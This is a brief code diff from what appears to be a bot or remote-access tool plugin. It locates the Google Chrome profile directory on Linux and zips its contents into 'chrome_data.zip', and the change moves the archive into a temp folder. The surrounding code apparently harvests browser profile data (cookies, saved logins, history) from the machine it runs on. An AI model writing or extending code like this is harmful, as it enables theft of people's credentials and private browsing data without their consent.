@@ -60,7 +60,7 @@ class Main(Plugin):
             elif self.bot.platform in ['linux', 'linux2']:
                 path = os.path.join(os.environ.get('HOME'), '.config/google-chrome/Default')
 
-            zname = self.bot.generate_file_name('chrome_data.zip')
+            zname = self.bot.get_tmp(self.bot.generate_file_name('chrome_data.zip'))
 
 
             with ZipFile(zname, 'w') as z:
